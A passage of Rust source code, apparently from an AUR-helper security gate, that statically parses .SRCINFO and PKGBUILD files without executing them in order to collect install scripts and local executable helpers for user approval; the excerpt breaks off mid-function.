use std::collections::HashSet;
use std::fmt::Write as _;
use std::fs;
use std::io::Read;
use std::path::{Component, Path, PathBuf};

use sha2::{Digest, Sha256};

const MAX_LOCAL_SOURCE_BYTES: u64 = 1024 * 1024;
const MAX_TOTAL_LOCAL_SOURCE_BYTES: u64 = 4 * 1024 * 1024;
const LOCAL_FILE_BOUNDARY: &str = "\n\n__bewaur_file_boundary__\n\n";
const APPROVAL_DIGEST_DOMAIN: &[u8] = b"bewaur-build-tree-approval:v1:p1";
const APPROVAL_DIGEST_PREFIX: &str = "sha256:v1:p1:";
const MAX_APPROVAL_TREE_ENTRIES: usize = 200_000;
const MAX_APPROVAL_TREE_BYTES: u64 = 32 * 1024 * 1024 * 1024;

/// Inert inputs loaded from the exact build tree an AUR helper is about to use.
#[derive(Debug, PartialEq, Eq)]
pub struct LocalBuildTree {
    pub build_dir: PathBuf,
    pub pkgbase: String,
    pub package_names: Vec<String>,
    pub pkgbuild_content: String,
    pub install_script_paths: Vec<String>,
    pub install_script_content: Option<String>,
    pub local_source_paths: Vec<String>,
    pub local_source_content: Option<String>,
}

#[derive(Debug, PartialEq, Eq)]
struct SrcInfo {
    pkgbase: String,
    package_names: Vec<String>,
    install_scripts: Vec<String>,
    local_sources: Vec<String>,
}

/// Validated package identity and inert `.SRCINFO` declarations.
pub struct LocalBuildManifest {
    build_dir: PathBuf,
    srcinfo: SrcInfo,
}

impl LocalBuildManifest {
    pub fn pkgbase(&self) -> &str {
        &self.srcinfo.pkgbase
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ShellWord {
    value: String,
    line: usize,
    has_expansion: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum ShellToken {
    Word(ShellWord),
    InputRedirection(ShellWord),
    Boundary,
    LeftParen,
    RightParen,
}

#[derive(Debug, PartialEq, Eq)]
struct ShellCommand {
    words: Vec<ShellWord>,
    input_files: Vec<ShellWord>,
}

#[derive(Debug, PartialEq, Eq)]
struct ShellArrayAssignment {
    name: String,
    words: Vec<ShellWord>,
    line: usize,
    nested_syntax: bool,
    global_source_assignment: bool,
}

#[derive(Debug, PartialEq, Eq)]
struct ShellProgram {
    commands: Vec<ShellCommand>,
    arrays: Vec<ShellArrayAssignment>,
}

#[derive(Debug, PartialEq, Eq)]
struct LocalSourceCandidate {
    path: String,
    explicitly_executed: bool,
    must_exist_before_build: bool,
}

#[derive(Debug, PartialEq, Eq)]
struct FingerprintEntry {
    entry_type: u8,
    logical_path: Vec<u8>,
    resolved_path: Vec<u8>,
    mode: u32,
    size: u64,
    content_digest: [u8; 32],
}

#[derive(Default)]
struct FingerprintState {
    entries: Vec<FingerprintEntry>,
    total_bytes: u64,
}

impl FingerprintState {
    fn push(&mut self, entry: FingerprintEntry) -> Result<(), String> {
        if self.entries.len() >= MAX_APPROVAL_TREE_ENTRIES {
            return Err(format!(
                "build tree exceeds the {MAX_APPROVAL_TREE_ENTRIES} entry fingerprint limit"
            ));
        }
        self.total_bytes = self
            .total_bytes
            .checked_add(entry.size)
            .ok_or_else(|| "build tree fingerprint size overflowed".to_string())?;
        if self.total_bytes > MAX_APPROVAL_TREE_BYTES {
            return Err(format!(
                "build tree exceeds the {MAX_APPROVAL_TREE_BYTES} byte fingerprint limit"
            ));
        }
        self.entries.push(entry);
        Ok(())
    }
}

/// Load a checked-out AUR build tree without evaluating any shell code.
///
/// This is the common one-shot entry point for both a helper-provided build
/// directory and a cached AUR Git checkout. `.SRCINFO` supplies package
/// identities and makepkg-resolved paths; the PKGBUILD is inspected
/// independently for stale declarations and executable local helpers. All
/// files are canonicalized and required to remain inside `build_dir` before
/// they are read.
pub fn load_build_tree(build_dir: &Path, expected_pkgbase: &str) -> Result<LocalBuildTree, String> {
    let manifest = load_build_manifest(build_dir, expected_pkgbase)?;
    load_build_tree_from_manifest(manifest)
}

/// Load a complete build tree for an explicit user approval. The package base
/// is taken from the inert `.SRCINFO`; the Paru gate independently checks that
/// identity against its `PKGBASE` environment before consulting the approval.
pub fn load_build_tree_for_approval(build_dir: &Path) -> Result<LocalBuildTree, String> {
    let manifest = load_build_manifest_inner(build_dir)?;
    load_build_tree_from_manifest(manifest)
}

/// Read only enough inert state to validate the Paru-supplied package base.
/// This lets an explicit permanent package-base allowance be considered only
/// after `.SRCINFO` proves the Paru-supplied identity, without trusting a
/// directory name or evaluating the PKGBUILD.
pub fn load_build_manifest(
    build_dir: &Path,
    expected_pkgbase: &str,
) -> Result<LocalBuildManifest, String> {
    validate_package_name(expected_pkgbase, "PKGBASE")?;

    let manifest = load_build_manifest_inner(build_dir)?;
    if manifest.srcinfo.pkgbase != expected_pkgbase {
        return Err(format!(
            "PKGBASE mismatch: environment says {expected_pkgbase}, but .SRCINFO says {}",
            manifest.srcinfo.pkgbase
        ));
    }

    Ok(manifest)
}

fn load_build_manifest_inner(build_dir: &Path) -> Result<LocalBuildManifest, String> {
    let build_dir = fs::canonicalize(build_dir).map_err(|error| {
        format!(
            "cannot resolve build directory {}: {error}",
            build_dir.display()
        )
    })?;
    if !build_dir.is_dir() {
        return Err(format!(
            "build directory is not a directory: {}",
            build_dir.display()
        ));
    }

    let srcinfo_content = read_tree_file(&build_dir, ".SRCINFO", ".SRCINFO")?;
    let srcinfo = parse_srcinfo(&srcinfo_content)?;

    Ok(LocalBuildManifest { build_dir, srcinfo })
}

pub fn load_build_tree_from_manifest(
    manifest: LocalBuildManifest,
) -> Result<LocalBuildTree, String> {
    let LocalBuildManifest { build_dir, srcinfo } = manifest;
    let pkgbuild_content = read_tree_file(&build_dir, "PKGBUILD", "PKGBUILD")?;

    // `.SRCINFO` is metadata supplied by the package author and can be stale.
    // Independently inspect the PKGBUILD for literal install assignments and
    // read the union. Dynamic assignments are not safely resolvable without
    // evaluating attacker-controlled shell, so they fail closed.
    let pkgbuild_install_scripts = extract_install_scripts(
        &pkgbuild_content,
        &srcinfo.pkgbase,
        &srcinfo.package_names,
        &srcinfo.install_scripts,
    )?;
    let mut install_script_paths = srcinfo.install_scripts;
    let mut seen_install_scripts: HashSet<String> = install_script_paths.iter().cloned().collect();
    for install_script in pkgbuild_install_scripts {
        if seen_install_scripts.insert(install_script.clone()) {
            install_script_paths.push(install_script);
        }
    }

    let mut install_contents = Vec::with_capacity(install_script_paths.len());
    for install_script in &install_script_paths {
        install_contents.push(read_tree_file(
            &build_dir,
            install_script,
            "install script",
        )?);
    }

    let install_script_content = if install_contents.is_empty() {
        None
    } else {
        // Features currently accept one install-script input. A blank line
        // keeps independently parsed scripts from sharing a source line.
        Some(install_contents.join("\n\n"))
    };

    let local_source_candidates = discover_local_source_candidates(
        &pkgbuild_content,
        &srcinfo.pkgbase,
        &srcinfo.package_names,
        &srcinfo.local_sources,
    )?;
    let mut local_source_paths = Vec::new();
    let mut local_source_contents = Vec::new();
    let mut total_local_source_bytes = 0u64;
    for candidate in local_source_candidates {
        if !candidate.must_exist_before_build {
            let requested = build_dir.join(&candidate.path);
            match fs::symlink_metadata(&requested) {
                Ok(_) => {}
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
                Err(error) => {
                    return Err(format!(
                        "cannot inspect local executable helper {}: {error}",
                        requested.display()
                    ));
                }
            }
        }
        // Resolve every referenced local file, including inert archives and
        // patches, so a missing file or escaping symlink cannot hide behind
        // the executable-helper filter.
        let resolved = resolve_tree_file(&build_dir, &candidate.path, "local source")?;
        let metadata = fs::metadata(&resolved).map_err(|error| {
            format!(
                "cannot inspect local source {}: {error}",
                resolved.display()
            )
        })?;
        if !candidate.explicitly_executed
            && !is_likely_executable_path(&candidate.path)
            && !is_executable_mode(&metadata)
            && !has_shebang(&resolved)?
        {
            continue;
        }

        let size = metadata.len();
        if size > MAX_LOCAL_SOURCE_BYTES {
            return Err(format!(
                "local executable helper {:?} exceeds the {} byte scan limit",
                candidate.path, MAX_LOCAL_SOURCE_BYTES
            ));
        }
        total_local_source_bytes = total_local_source_bytes.saturating_add(size);
        if total_local_source_bytes > MAX_TOTAL_LOCAL_SOURCE_BYTES {
            return Err(format!(
                "local executable helpers exceed the {} byte total scan limit",
                MAX_TOTAL_LOCAL_SOURCE_BYTES
            ));
        }

        let bytes = fs::read(&resolved)
            .map_err(|error| format!("cannot read local source {}: {error}", resolved.display()))?;
        local_source_paths.push(candidate.path);
        local_source_contents.push(String::from_utf8_lossy(&bytes).into_owned());
    }
    let local_source_content = if local_source_contents.is_empty() {
        None
    } else {
        Some(local_source_contents.join(LOCAL_FILE_BOUNDARY))
    };

    Ok(LocalBuildTree {
        build_dir,
        pkgbase: srcinfo.pkgbase,
        package_names: srcinfo.package_names,
        pkgbuild_content,
        install_script_paths,
        install_script_content,
        local_source_paths,
        local_source_content,
    })
}

fn parse_srcinfo(content: &str) -> Result<SrcInfo, String> {
    let mut pkgbase = None;
    let mut package_names = Vec::new();
    let mut install_scripts = Vec::new();
    let mut local_sources = Vec::new();
    let mut seen_packages = HashSet::new();
    let mut seen_install_scripts = HashSet::new();
    let mut seen_local_sources = HashSet::new();

    for (index, line) in content.lines().enumerate() {
        let line_number = index + 1;
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        let Some((key, value)) = trimmed.split_once('=') else {
            return Err(format!(
                "invalid .SRCINFO line {line_number}: expected key = value"
            ));
        };
        let key = key.trim();
        let value = value.trim();

        match key {
            "pkgbase" => {
                validate_package_name(value, ".SRCINFO pkgbase")?;
                if pkgbase.replace(value.to_string()).is_some() {
                    return Err("invalid .SRCINFO: multiple pkgbase entries".to_string());
                }
            }
            "pkgname" => {
                validate_package_name(value, ".SRCINFO pkgname")?;
                if seen_packages.insert(value.to_string()) {
                    package_names.push(value.to_string());
                }
            }
            "install" => {
                validate_relative_path(value, "install script")?;
                if seen_install_scripts.insert(value.to_string()) {
                    install_scripts.push(value.to_string());
                }
            }
            key if key == "source" || key.starts_with("source_") => {
                if let Some(local_source) = parse_local_source(value)?
                    && seen_local_sources.insert(local_source.clone())
                {
                    local_sources.push(local_source);
                }
            }
            _ => {}
        }
    }

    let pkgbase = pkgbase.ok_or_else(|| "invalid .SRCINFO: missing pkgbase".to_string())?;
    if package_names.is_empty() {
        return Err("invalid .SRCINFO: missing pkgname".to_string());
    }

    Ok(SrcInfo {
        pkgbase,
        package_names,
        install_scripts,
        local_sources,
    })
}

fn parse_local_source(value: &str) -> Result<Option<String>, String> {
    let source = value
        .split_once("::")
        .map_or(value, |(_, source)| source)
        .trim();
    let scheme = source.split_once(':').and_then(|(candidate, _)| {
        let mut chars = candidate.chars();
        let first = chars.next()?;
        (first.is_ascii_alphabetic()
            && chars.all(|character| {
                character.is_ascii_alphanumeric() || matches!(character, '+' | '-' | '.')
            }))
        .then_some(candidate)
    });

    if let Some(scheme) = scheme {
        if scheme.eq_ignore_ascii_case("file") {
            return Err(format!(
                "file URL source is not confined to the build directory: {value:?}"
            ));
        }
        return Ok(None);
    }

    Ok(Some(normalize_relative_path(source, "local source")?))
}

/// Tokenize shell syntax without evaluating expansions and without treating
/// heredoc bodies or comments as code. Command boundaries and array
/// parentheses are retained so data words cannot masquerade as assignments.
fn shell_tokens(content: &str) -> Result<Vec<ShellToken>, String> {
    let chars: Vec<char> = content.chars().collect();
    let mut tokens = Vec::new();
    let mut word = String::new();
    let mut word_line = 1usize;
    let mut word_started = false;
    let mut has_expansion = false;
    let mut quote = None;
    let mut line = 1usize;
    let mut index = 0usize;
    let mut expected_heredoc = None;
    let mut discard_redirection_target = false;
    let mut input_redirection_target = false;
    let mut pending_heredocs: Vec<(String, bool)> = Vec::new();
    let mut parameter_brace_depth = 0usize;
    let mut arithmetic_paren_depth = None;

    let finish_word = |tokens: &mut Vec<ShellToken>,
                       word: &mut String,
                       word_started: &mut bool,
                       has_expansion: &mut bool,
                       expected_heredoc: &mut Option<bool>,
                       discard_redirection_target: &mut bool,
                       input_redirection_target: &mut bool,
                       pending_heredocs: &mut Vec<(String, bool)>,
                       word_line: usize|
     -> Result<(), String> {
        if !*word_started {
            return Ok(());
        }

        let value = std::mem::take(word);
        let expanded = std::mem::take(has_expansion);
        *word_started = false;
        if let Some(strip_tabs) = expected_heredoc.take() {
            if value.is_empty() || expanded {
                return Err(format!(
                    "cannot statically parse heredoc delimiter on line {word_line}"
                ));
            }
            pending_heredocs.push((value, strip_tabs));
        } else if std::mem::take(discard_redirection_target) {
            // Redirection targets affect I/O, not the command's assignment or
            // argument positions. They must not turn assignment-only commands
            // into apparent commands or metadata-like data into assignments.
        } else if std::mem::take(input_redirection_target) {
            tokens.push(ShellToken::InputRedirection(ShellWord {
                value,
                line: word_line,
                has_expansion: expanded,
            }));
        } else {
            tokens.push(ShellToken::Word(ShellWord {
                value,
                line: word_line,
                has_expansion: expanded,
            }));
        }
        Ok(())
    };

    while index < chars.len() {
        let character = chars[index];

        if let Some(nested_depth) = arithmetic_paren_depth.as_mut() {
            if character == ')' && *nested_depth == 0 && chars.get(index + 1) == Some(&')') {
                word.push(')');
                word.push(')');
                arithmetic_paren_depth = None;
                index += 2;
                continue;
            }
            match character {
                '(' => *nested_depth += 1,
                ')' if *nested_depth > 0 => *nested_depth -= 1,
                '\n' => line += 1,
                _ => {}
            }
            word.push(character);
            index += 1;
            continue;
        }

        if let Some(delimiter) = quote {
            if character == delimiter {
                quote = None;
            } else if character == '\\' && delimiter == '"' {
                if index + 1 >= chars.len() {
                    return Err(format!("unterminated escape on line {line}"));
                }
                let next = chars[index + 1];
                if next == '\n' {
                    line += 1;
                } else {
                    word.push(next);
                }
                index += 1;
            } else {
                if delimiter == '"' && matches!(character, '$' | '`') {
                    has_expansion = true;
                }
                if character == '\n' {
                    line += 1;
                }
                word.push(character);
            }
            index += 1;
            continue;
        }

        match character {
            '(' if chars.get(index + 1) == Some(&'(') => {
                if !word_started {
                    word_line = line;
                    word_started = true;
                }
                word.push('(');
                word.push('(');
                arithmetic_paren_depth = Some(0);
                index += 1;
            }
            '\'' | '"' => {
                if !word_started {
                    word_line = line;
                    word_started = true;
                }
                quote = Some(character);
            }
            '\\' => {
                if index + 1 >= chars.len() {
                    return Err(format!("unterminated escape on line {line}"));
                }
                let next = chars[index + 1];
                if next == '\n' {
                    line += 1;
                } else {
                    if !word_started {
                        word_line = line;
                        word_started = true;
                    }
                    word.push(next);
                }
                index += 1;
            }
            '#' if !word_started => {
                while index < chars.len() && chars[index] != '\n' {
                    index += 1;
                }
                continue;
            }
            '<' if index + 1 < chars.len() && chars[index + 1] == '<' => {
                if word_started
                    && !word.is_empty()
                    && word.bytes().all(|byte| byte.is_ascii_digit())
                {
                    word.clear();
                    word_started = false;
                    has_expansion = false;
                } else {
                    finish_word(
                        &mut tokens,
                        &mut word,
                        &mut word_started,
                        &mut has_expansion,
                        &mut expected_heredoc,
                        &mut discard_redirection_target,
                        &mut input_redirection_target,
                        &mut pending_heredocs,
                        word_line,
                    )?;
                }
                if index + 2 < chars.len() && chars[index + 2] == '<' {
                    discard_redirection_target = true;
                    index += 2; // Here-string, not a heredoc body.
                } else if index + 2 < chars.len() && chars[index + 2] == '-' {
                    expected_heredoc = Some(true);
                    index += 2;
                } else {
                    expected_heredoc = Some(false);
                    index += 1;
                }
            }
            '{' if word.ends_with('$') || parameter_brace_depth > 0 => {
                if !word_started {
                    word_line = line;
                    word_started = true;
                }
                parameter_brace_depth += 1;
                word.push(character);
            }
            '}' if parameter_brace_depth > 0 => {
                parameter_brace_depth -= 1;
                word.push(character);
            }
            '{' | '}' if word_started => word.push(character),
            '\n' => {
                finish_word(
                    &mut tokens,
                    &mut word,
                    &mut word_started,
                    &mut has_expansion,
                    &mut expected_heredoc,
                    &mut discard_redirection_target,
                    &mut input_redirection_target,
                    &mut pending_heredocs,
                    word_line,
                )?;
                if expected_heredoc.is_some() {
                    return Err(format!("missing heredoc delimiter on line {line}"));
                }
                if discard_redirection_target || input_redirection_target {
                    return Err(format!("missing redirection target on line {line}"));
                }
                tokens.push(ShellToken::Boundary);
                line += 1;
                index += 1;

                for (delimiter, strip_tabs) in pending_heredocs.drain(..) {
                    let mut found = false;
                    while index <= chars.len() {
                        let start = index;
                        while index < chars.len() && chars[index] != '\n' {
                            index += 1;
                        }
                        let body_line: String = chars[start..index].iter().collect();
                        let compared = if strip_tabs {
                            body_line.trim_start_matches('\t')
                        } else {
                            body_line.as_str()
                        };
                        if compared == delimiter {
                            if index < chars.len() {
                                index += 1;
                                line += 1;
                            }
                            found = true;
                            break;
                        }
                        if index >= chars.len() {
                            break;
                        }
                        index += 1;
                        line += 1;
                    }
                    if !found {
                        return Err(format!("unterminated heredoc {delimiter:?}"));
                    }
                }
                continue;
            }
            character if character.is_whitespace() => {
                finish_word(
                    &mut tokens,
                    &mut word,
                    &mut word_started,
                    &mut has_expansion,
                    &mut expected_heredoc,
                    &mut discard_redirection_target,
                    &mut input_redirection_target,
                    &mut pending_heredocs,
                    word_line,
                )?;
            }
            '&' if chars.get(index + 1) == Some(&'>') => {
                finish_word(
                    &mut tokens,
                    &mut word,
                    &mut word_started,
                    &mut has_expansion,
                    &mut expected_heredoc,
                    &mut discard_redirection_target,
                    &mut input_redirection_target,
                    &mut pending_heredocs,
                    word_line,
                )?;
                discard_redirection_target = true;
                index += 1;
                if chars.get(index + 1) == Some(&'>') {
                    index += 1;
                }
            }
            ';' | '|' | '&' | '{' | '}' => {
                finish_word(
                    &mut tokens,
                    &mut word,
                    &mut word_started,
                    &mut has_expansion,
                    &mut expected_heredoc,
                    &mut discard_redirection_target,
                    &mut input_redirection_target,
                    &mut pending_heredocs,
                    word_line,
                )?;
                if discard_redirection_target || input_redirection_target {
                    return Err(format!("missing redirection target on line {line}"));
                }
                tokens.push(ShellToken::Boundary);
            }
            '(' | ')' => {
                finish_word(
                    &mut tokens,
                    &mut word,
                    &mut word_started,
                    &mut has_expansion,
                    &mut expected_heredoc,
                    &mut discard_redirection_target,
                    &mut input_redirection_target,
                    &mut pending_heredocs,
                    word_line,
                )?;
                tokens.push(if character == '(' {
                    ShellToken::LeftParen
                } else {
                    ShellToken::RightParen
                });
            }
            '<' | '>' if chars.get(index + 1) == Some(&'(') => {
                // Process substitutions execute the command inside their
                // parentheses. Keep that command as an independent token span
                // instead of discarding its executable as a redirection target.
                finish_word(
                    &mut tokens,
                    &mut word,
                    &mut word_started,
                    &mut has_expansion,
                    &mut expected_heredoc,
                    &mut discard_redirection_target,
                    &mut input_redirection_target,
                    &mut pending_heredocs,
                    word_line,
                )?;
                if discard_redirection_target || input_redirection_target {
                    return Err(format!(
                        "cannot statically parse nested process substitution on line {line}"
                    ));
                }
                tokens.push(ShellToken::Boundary);
                tokens.push(ShellToken::LeftParen);
                index += 1;
            }
            '<' | '>' => {
                let explicit_fd = if word_started
                    && !word.is_empty()
                    && word.bytes().all(|byte| byte.is_ascii_digit())
                {
                    let fd = word.parse::<u8>().ok();
                    word.clear();
                    word_started = false;
                    has_expansion = false;
                    fd
                } else {
                    finish_word(
                        &mut tokens,
                        &mut word,
                        &mut word_started,
                        &mut has_expansion,
                        &mut expected_heredoc,
                        &mut discard_redirection_target,
                        &mut input_redirection_target,
                        &mut pending_heredocs,
                        word_line,
                    )?;
                    None
                };
                let fd = explicit_fd.unwrap_or(if character == '<' { 0 } else { 1 });
                let next = chars.get(index + 1).copied();
                let reads_file = character == '<'
                    && fd == 0
                    && !matches!(next, Some('<' | '&' | '|'));
                if reads_file {
                    input_redirection_target = true;
                } else {
                    discard_redirection_target = true;
                }
                if chars
                    .get(index + 1)
                    .is_some_and(|next| matches!(next, '<' | '>' | '&' | '|'))
                {
                    index += 1;
                }
            }
            _ => {
                if !word_started {
                    word_line = line;
                    word_started = true;
                }
                if matches!(character, '$' | '`') {
                    has_expansion = true;
                }
                word.push(character);
            }
        }

        index += 1;
    }

    if let Some(delimiter) = quote {
        return Err(format!("unterminated {delimiter} quote at end of PKGBUILD"));
    }
    if parameter_brace_depth > 0 {
        return Err("unterminated parameter expansion at end of PKGBUILD".to_string());
    }
    if arithmetic_paren_depth.is_some() {
        return Err("unterminated arithmetic expression at end of PKGBUILD".to_string());
    }
    finish_word(
        &mut tokens,
        &mut word,
        &mut word_started,
        &mut has_expansion,
        &mut expected_heredoc,
        &mut discard_redirection_target,
        &mut input_redirection_target,
        &mut pending_heredocs,
        word_line,
    )?;
    if discard_redirection_target || input_redirection_target {
        return Err("missing redirection target at end of PKGBUILD".to_string());
    }
    if expected_heredoc.is_some() || !pending_heredocs.is_empty() {
        return Err("unterminated heredoc declaration at end of PKGBUILD".to_string());
    }

    Ok(tokens)
}

fn parse_shell_program(content: &str) -> Result<ShellProgram, String> {
    let tokens = shell_tokens(content)?;
    let mut commands = Vec::new();
    let mut arrays = Vec::new();
    let mut command_words = Vec::new();
    let mut command_input_files = Vec::new();
    let mut index = 0usize;

    let finish_command = |commands: &mut Vec<ShellCommand>,
                          words: &mut Vec<ShellWord>,
                          input_files: &mut Vec<ShellWord>| {
        strip_shell_control_prefixes(words);
        if !words.is_empty() || !input_files.is_empty() {
            commands.push(ShellCommand {
                words: std::mem::take(words),
                input_files: std::mem::take(input_files),
            });
        }
    };

    while index < tokens.len() {
        match &tokens[index] {
            ShellToken::Word(word)
                if tokens.get(index + 1) == Some(&ShellToken::LeftParen)
                    && array_assignment_name(&word.value).is_some() =>
            {
                let name = array_assignment_name(&word.value).unwrap().to_string();
                let global_source_assignment = array_prefix_allows_global_source(&command_words);
                let mut words = Vec::new();
                let mut depth = 1usize;
                let mut nested_syntax = false;
                index += 2;
                while index < tokens.len() && depth > 0 {
                    match &tokens[index] {
                        ShellToken::Word(word) => words.push(word.clone()),
                        ShellToken::InputRedirection(_) => nested_syntax = true,
                        ShellToken::LeftParen => {
                            depth += 1;
                            nested_syntax = true;
                        }
                        ShellToken::RightParen => depth -= 1,
                        ShellToken::Boundary => {}
                    }
                    index += 1;
                }
                if depth != 0 {
                    return Err(format!(
                        "unterminated array assignment on PKGBUILD line {}",
                        word.line
                    ));
                }
                arrays.push(ShellArrayAssignment {
                    name,
                    words,
                    line: word.line,
                    nested_syntax,
                    global_source_assignment,
                });
                continue;
            }
            ShellToken::Word(word) => command_words.push(word.clone()),
            ShellToken::InputRedirection(word) => command_input_files.push(word.clone()),
            ShellToken::Boundary | ShellToken::LeftParen | ShellToken::RightParen => {
                finish_command(
                    &mut commands,
                    &mut command_words,
                    &mut command_input_files,
                );
            }
        }
        index += 1;
    }
    finish_command(
        &mut commands,
        &mut command_words,
        &mut command_input_files,
    );

    Ok(ShellProgram { commands, arrays })
}

fn strip_shell_control_prefixes(words: &mut Vec<ShellWord>) {
    loop {
        let Some(first) = words.first() else {
            return;
        };
        match first.value.as_str() {
            "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "!" => {
                words.remove(0);
            }
            "fi" | "done" | "esac" | "for" | "select" | "case" | "function" => {
                words.clear();
                return;
            }
            _ => return,
        }
    }
}

fn array_prefix_allows_global_source(prefix: &[ShellWord]) -> bool {
    let mut words = prefix.to_vec();
    strip_shell_control_prefixes(&mut words);
    let mut index = 0usize;
    while words
        .get(index)
        .is_some_and(|word| scalar_assignment(&word.value).is_some())
    {
        index += 1;
    }
    let Some(command) = words.get(index) else {
        return true;
    };
    let command = command.value.rsplit('/').next().unwrap_or_default();
    if command == "local" {
        return false;
    }
    if !matches!(command, "declare" | "typeset" | "readonly") {
        return false;
    }
    words[index + 1..]
        .iter()
        .all(|word| word.value.starts_with('-') || scalar_assignment(&word.value).is_some())
}

fn array_assignment_name(value: &str) -> Option<&str> {
    let name = value
        .strip_suffix("+=")
        .or_else(|| value.strip_suffix('='))?;
    is_shell_identifier(name).then_some(name)
}

fn is_shell_identifier(value: &str) -> bool {
    let mut characters = value.chars();
    characters
        .next()
        .is_some_and(|character| character == '_' || character.is_ascii_alphabetic())
        && characters.all(|character| character == '_' || character.is_ascii_alphanumeric())
}

/// Return the assignment target, value, and whether this is a simple `name=`
/// assignment rather than append/indexed syntax.
fn scalar_assignment(value: &str) -> Option<(&str, &str, bool)> {
    let (target, assigned) = value.split_once('=')?;
    if let Some(name) = target
        .strip_suffix('+')
        .filter(|name| is_shell_identifier(name))
    {
        return Some((name, assigned, false));
    }
    if let Some((name, index)) = target.split_once('[')
        && index.ends_with(']')
        && is_shell_identifier(name)
    {
        return Some((name, assigned, false));
    }
    is_shell_identifier(target).then_some((target, assigned, true))
}

fn extract_install_scripts(
    content: &str,
    pkgbase: &str,
    package_names: &[String],
    declared_install_scripts: &[String],
) -> Result<Vec<String>, String> {
    let program = parse_shell_program(content)?;
    let mut install_scripts = Vec::new();
    let mut seen = HashSet::new();
    let declared: HashSet<&str> = declared_install_scripts
        .iter()
        .map(String::as_str)
        .collect();

    for array in &program.arrays {
        if array.name == "install" {
            return Err(format!(
                "unsupported install array assignment on PKGBUILD line {}; use install=literal-path",
                array.line
            ));
        }
    }

    for command in &program.commands {
        let assignments: Vec<_> = command
            .words
            .iter()
            .map(|word| scalar_assignment(&word.value))
            .collect();
        if !assignments.is_empty() && assignments.iter().all(Option::is_some) {
            for (word, assignment) in command.words.iter().zip(assignments) {
                let (name, value, simple) = assignment.unwrap();
                if name != "install" {
                    continue;
                }
                if !simple {
                    return Err(format!(
                        "unsupported install assignment on PKGBUILD line {}; use install=literal-path",
                        word.line
                    ));
                }
                collect_install_assignment(
                    word,
                    value,
                    pkgbase,
                    package_names,
                    &declared,
                    &mut seen,
                    &mut install_scripts,
                )?;
            }
        } else {
            reject_recognizable_install_mutation(command)?;
        }
    }

    Ok(install_scripts)
}

fn collect_install_assignment(
    word: &ShellWord,
    value: &str,
    pkgbase: &str,
    package_names: &[String],
    declared: &HashSet<&str>,
    seen: &mut HashSet<String>,
    install_scripts: &mut Vec<String>,
) -> Result<(), String> {
    if value.is_empty() {
        return Err(format!(
            "dynamic or empty install assignment on PKGBUILD line {}; use a literal path",
            word.line
        ));
    }

    let resolved = if word.has_expansion {
        resolve_known_install_template(value, pkgbase, package_names).ok_or_else(|| {
            format!(
                "dynamic install assignment on PKGBUILD line {} cannot be resolved safely",
                word.line
            )
        })?
    } else if value.contains('$') || value.contains('`') {
        return Err(format!(
            "install assignment on PKGBUILD line {} contains a literal expansion marker and cannot be resolved safely",
            word.line
        ));
    } else {
        vec![value.to_string()]
    };

    for install_script in resolved {
        validate_relative_path(&install_script, "install script")?;
        if word.has_expansion && !declared.contains(install_script.as_str()) {
            return Err(format!(
                "install assignment on PKGBUILD line {} resolves to {install_script:?}, which .SRCINFO does not declare",
                word.line
            ));
        }
        if seen.insert(install_script.clone()) {
            install_scripts.push(install_script);
        }
    }

    Ok(())
}

fn reject_recognizable_install_mutation(command: &ShellCommand) -> Result<(), String> {
    let Some(command_index) = effective_command_index(&command.words) else {
        return Ok(());
    };
    let command_name = command.words[command_index]
        .value
        .rsplit('/')
        .next()
        .unwrap_or_default();
    let arguments = &command.words[command_index + 1..];
    let mut mutates_install = false;

    match command_name {
        "printf" => {
            mutates_install = printf_option_mutates_install(arguments);
        }
        "read" => mutates_install = read_mutates_install(arguments),
        "mapfile" | "readarray" => mutates_install = mapfile_mutates_install(arguments),
        "unset" | "let" => {
            mutates_install = arguments
                .iter()
                .filter(|argument| argument.value != "--" && !argument.value.starts_with('-'))
                .any(mutation_target_is_install_or_dynamic);
        }
        "declare" | "typeset" | "local" | "export" | "readonly" => {
            mutates_install = arguments
                .iter()
                .filter(|argument| !argument.value.starts_with('-'))
                .any(mutation_target_is_install_or_dynamic);
            let nameref = arguments.iter().any(|argument| {
                argument.value == "-n"
                    || (argument.value.starts_with('-') && argument.value.contains('n'))
            });
            if nameref {
                mutates_install |= arguments.iter().any(|argument| {
                    scalar_assignment(&argument.value).is_some_and(|(_, value, _)| {
                        value == "install" || contains_dynamic_shell_text(value)
                    })
                });
            }
        }
        "eval" => {
            let evaluated = arguments
                .iter()
                .map(|argument| argument.value.as_str())
                .collect::<Vec<_>>()
                .join(" ");
            mutates_install = recognizable_install_mutation_text(&evaluated);
        }
        _ => {}
    }

    if mutates_install {
        return Err(format!(
            "recognizable indirect install mutation via {command_name} on PKGBUILD line {} cannot be resolved safely",
            command.words[command_index].line
        ));
    }
    Ok(())
}

fn printf_option_mutates_install(arguments: &[ShellWord]) -> bool {
    let Some(first) = arguments.first() else {
        return false;
    };
    if first.value == "--" {
        return false;
    }
    if first.value == "-v" {
        return arguments
            .get(1)
            .is_some_and(mutation_target_is_install_or_dynamic);
    }
    let Some(target) = first.value.strip_prefix("-v").filter(|target| !target.is_empty()) else {
        return false;
    };
    is_install_target(target) || contains_dynamic_shell_text(target)
}

fn read_mutates_install(arguments: &[ShellWord]) -> bool {
    let mut index = 0usize;
    while index < arguments.len() {
        let argument = &arguments[index];
        if argument.value == "--" {
            return arguments[index + 1..]
                .iter()
                .any(mutation_target_is_install_or_dynamic);
        }
        if argument.value == "-a" {
            return arguments
                .get(index + 1)
                .is_some_and(mutation_target_is_install_or_dynamic);
        }
        if matches!(
            argument.value.as_str(),
            "-d" | "-i" | "-n" | "-N" | "-p" | "-t" | "-u"
        ) {
            index += 2;
            continue;
        }
        if argument.value.starts_with('-') {
            index += 1;
            continue;
        }
        return arguments[index..]
            .iter()
            .any(mutation_target_is_install_or_dynamic);
    }
    false
}

fn mapfile_mutates_install(arguments: &[ShellWord]) -> bool {
    let mut index = 0usize;
    while index < arguments.len() {
        let argument = &arguments[index];
        if argument.value == "--" {
            return arguments
                .get(index + 1)
                .is_some_and(mutation_target_is_install_or_dynamic);
        }
        if matches!(
            argument.value.as_str(),
            "-n" | "-O" | "-s" | "-u" | "-C" | "-c"
        ) {
            index += 2;
            continue;
        }
        if argument.value.starts_with('-') {
            index += 1;
            continue;
        }
        return mutation_target_is_install_or_dynamic(argument);
    }
